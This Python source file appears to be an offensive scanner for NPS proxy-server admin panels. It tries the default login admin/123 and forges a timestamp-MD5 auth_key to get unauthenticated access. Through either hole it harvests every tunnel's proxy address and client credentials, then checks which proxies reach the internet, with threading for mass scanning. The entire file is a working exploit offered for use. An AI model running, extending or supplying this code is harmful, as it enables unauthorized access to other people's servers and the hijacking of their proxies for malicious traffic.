import hashlib
import time
import json
import threading

import requests
from urllib.parse import urlparse


class NpsScan:
    header = {
        "User-Agent": "Mozilla/5.2 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }

    @staticmethod
    def get_token():
        """
        :return:
        """
        timestamp = int(time.time())
        m = hashlib.md5()
        m.update(str(timestamp).encode("utf8"))
        auth_key = m.hexdigest()
        return auth_key, timestamp

    @staticmethod
    def weak_passwd_check(url):
        """
        弱口令检测
        :return: 返回True或False
        """
        url += "/login/verify"
        data = {
            "username": "admin",
            "password": "123"
        }
        req = requests.session()
        req.headers = NpsScan.header
        try:
            res = req.post(url=url, data=data)
        except Exception:
            # 请求失败，直接返回False
            return False, None

        # 处理一下，可能返回的不是json内容
        try:
            json_result = json.loads(res.text)["status"]
            if json_result == 1:
                print(url, "---存在弱口令")
                return True, req
            else:
                return False, None
        except Exception:
            return False, None

    @staticmethod
    def unauthorized_access_check(url) -> bool:
        """
        未授权访问检测
        :return:
        """
        url += "/client/list"
        data = "search=&order=asc&offset=0&limit=10&auth_key=%s&timestamp=%s" % NpsScan.get_token()
        data = {item.split("=")[0]: item.split("=")[1] for item in data.split('&')}
        try:
            res = requests.post(url=url, headers=NpsScan.header, data=data, allow_redirects=False)
        except Exception:
            return False
        if res.status_code == 200:
            print(url, "---存在未授权访问")
            return True
        else:
            return False

    @staticmethod
    def get_proxy(url, req=None) -> dict:
        """
        获取代理
        :return: 返回代理端口列表
        """
        if not req:
            req = requests.session()
            req.headers = NpsScan.header

        ip = url.split("//")[1].split(":")[0]
        url += "/index/gettunnel"
        prefix_list = ["http", "socks5"]
        proxy_list = ["httpProxy", "socks5"]
        final_dic = {"http": [], "socks5": []}
        for prefix, proxy in zip(prefix_list, proxy_list):
            data = "offset=0&limit=10&type=&client_id=&search=&auth_key=%s&timestamp=%s" % NpsScan.get_token()
            data = {item.split("=")[0]: item.split("=")[1] for item in data.split('&')}
            data["type"] = proxy
            res = req.post(url=url, data=data, headers=NpsScan.header, timeout=3)
            data["limit"] = json.loads(res.text)["total"]  # 确保拿到所有代理端口

            # 抽取所有的可用的端口
            res = req.post(url=url, data=data, headers=NpsScan.header, timeout=3)
            hp_list = json.loads(res.text)["rows"]
            for hp in hp_list:
                if hp["RunStatus"] and hp["Status"] and hp["Client"]["IsConnect"]:
                    # 拼接所有
                    if hp["Client"]["Cnf"]["U"]:
                        _ = "%s://%s:%s@%s:%s" % (
                        prefix, hp["Client"]["Cnf"]["U"], hp["Client"]["Cnf"]["P"], ip, hp["Port"])
                    else:
                        _ = "%s://%s:%s" % (prefix, ip, hp["Port"])
                    final_dic[prefix].append(_)
                    # print(final_dic)
        # print(final_dic)
        return final_dic

    @staticmethod
    def check_connection(proxy):
        """
        检测出网情况
        :return:
        """
        target_url = ["https://www.facebook.com", "https://www.baidu.com"]  # 过内外地址
        type_url = ["out", "in"]
        proxies = [{
            "http": proxy,
            "https": proxy,
        }]
        if "socks5" in proxy:
            proxies.append({
                "http": proxy.replace("socks5", "socks5h"),
                "https": proxy.replace("socks5", "socks5h"),
            })
        # print(proxy)
        # print(proxies)
        result = {"out": False, "in": False}

        # 测试线路
        def test_conn(url, type_ , proxy):
            try:
                res = requests.get(url=url, headers=NpsScan.header, proxies=proxy, timeout=3)
                if res.status_code == 200:
                    # print(proxy, "---success---", url, )
                    result[type_] = True
                else:
                    print("!=200", res.status_code)
            except Exception:
                pass

        for url, type_ in zip(target_url, type_url):
            for pro in proxies:
                test_conn(url, type_, pro)

        # print(result)
        return result

    @staticmethod
    def single_target_process(url):
        """
        单一目标整体流程
        :return:
        """
        # 0、格式化url
        parsed_url = urlparse(url)
        url = parsed_url.scheme + "://" + str(parsed_url.hostname) + ":" + str(parsed_url.port if parsed_url.port else '')

        # 1、测试是否存在漏洞
        w_flag, req = NpsScan.weak_passwd_check(url)
        u_flag = NpsScan.unauthorized_access_check(url)

        if not w_flag and not u_flag:
            # 不存在漏洞
            return
        # 当存在漏洞时，就可以尝试存储这个目标，即使没有可以直接能利用的代理，或许也能通过其它方式操作一下
        info = {"w_flag": w_flag, "u_flag": u_flag, "url": url}
        # 2、利用漏洞抓取代理
        try:
            proxies_dic = NpsScan.get_proxy(url, req)
            # print(proxies_dic)
        except Exception:
            return info

        # 3、进行探存活测试，并生成记录结果
        alive_proxies = {}
        for item in proxies_dic:
            alive_proxies[item] = []
            for proxy in proxies_dic[item]:
                _ = {}
                result_dic = NpsScan.check_connection(proxy)
                if result_dic['out'] or result_dic['in']:
                    _['proxy'] = proxy
                    _['status'] = result_dic
                alive_proxies[item].append(_)
        # print(alive_proxies)
        # 返回含记录的文件，当对访问外网有要求时
        if alive_proxies['http'] or alive_proxies['socks5']:
            info["alive_proxies"] = alive_proxies
        return info

    @staticmethod
    def th_single_target_process(url, tar_li, lock):

        info = NpsScan.single_target_process(url)
        # 如果有信息才返回
        if info:
            print(info)
            # 确保安全
            lock.acquire()
            tar_li.append(info)
            lock.release()
